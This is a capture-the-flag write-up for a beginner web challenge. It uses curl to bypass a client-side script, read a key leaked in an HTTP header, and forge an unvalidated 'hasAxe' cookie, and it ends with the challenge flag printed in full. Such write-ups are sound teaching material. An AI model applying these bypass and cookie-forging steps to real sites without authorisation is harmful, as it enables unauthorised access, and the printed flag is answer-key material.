# Web CTF Writeup: Browser Boss Fight

## Overview
**Challenge:** Browser Boss Fight  
**Points:** 100  
**Difficulty:** Web Easy  
**Author:** Ian/ianstadtlander  
**Hint:** "Check what the local script is doing to your key attempts... how could you bypass it?"  

## Step 1: Bypassing the Frontend Script
Navigating to the challenge URL revealed a simple HTML page with a form requiring a key. Looking at the page source, I found an inline JavaScript snippet bound to the form submission:

```html
<script>
    document.getElementById('key-form').onsubmit = function() {
        const knockOnDoor = document.getElementById('key');
        // It replaces whatever they typed with 'WEAK_NON_KOOPA_KNOCK'
        knockOnDoor.value = "WEAK_NON_KOOPA_KNOCK"; 
        return true; 
    };
</script>
```

This script intercepts typed keys and forcefully overwrites the form data just before it's sent to the server. To bypass this, we don't need a browser. We can interact with the server directly using `curl` and send a `POST` request to the `/password-attempt` endpoint without the JavaScript interference.

```bash
curl -i -X POST http://browser-boss-fight.web.ctf.umasscybersec.org:32770/password-attempt -d "key=test"
```

## Step 2: Extracting the Real Key
When sending that bypassed request, the server responds with a redirect, and most importantly, it returns an unusual HTTP `Server` header in the response:

```http
HTTP/1.1 302 Found
X-Powered-By: Express
Server: BrOWSERS CASTLE (A note outside: "King Koopa, if you forget the key, check under_the_doormat! - Sincerely, your faithful servant, Kamek")
Location: /kamek.html
...
```

The header gave away the actual key we needed to provide: `under_the_doormat`. Let's create a new `POST` request with the newly found key and save the cookie file so we stay authenticated in the next steps:

```bash
curl -i -c cookies.txt -X POST http://browser-boss-fight.web.ctf.umasscybersec.org:32770/password-attempt -d "key=under_the_doormat"
```

The server accepted the key and redirected us to `/bowsers_castle.html`, setting an authenticated session cookie `connect.sid`.

## Step 3: Defeating Bowser (Restoring the Axe)
Accessing `/bowsers_castle.html` using the newly authenticated cookie returns a page with a message from Bowser:

> "I don't know how you got in, but you can't possibly defeat me! I removed the axe!"

I began investigating `/bowsers_castle.html` closely, particularly monitoring the HTTP headers. The server hurled an absolute nightmare of cookies (e.g., `goomba_guard_1`, `mushroom_huffing_italian_12`) simply to serve as a smokescreen, obscuring the single cookie that controls the win state: 

```http
Set-Cookie: hasAxe=false; Path=/
```

Since the state is held client-side via unvalidated cookies, we can just give ourselves the axe. I crafted a final `GET` request appending `hasAxe=true` to my authenticated `connect.sid` cookie.

```bash
curl -v --cookie "hasAxe=true; connect.sid=s%3A2-SE7lx5..." http://browser-boss-fight.web.ctf.umasscybersec.org:32770/bowsers_castle.html
```

## The Flag
With the axe acquired, the server accepted our request and returned the hidden `.victory-body` page source:

```html
<!DOCTYPE html>
<html>
<head>
    <link rel="stylesheet" href="../css/style.css">
</head>
<body class="victory-body">
    <p class="victory-text">UMASS{br0k3n_1n_2_b0wz3r5_c4st13}</p>
</body>
</html>
```

**Flag:** `UMASS{br0k3n_1n_2_b0wz3r5_c4st13}`
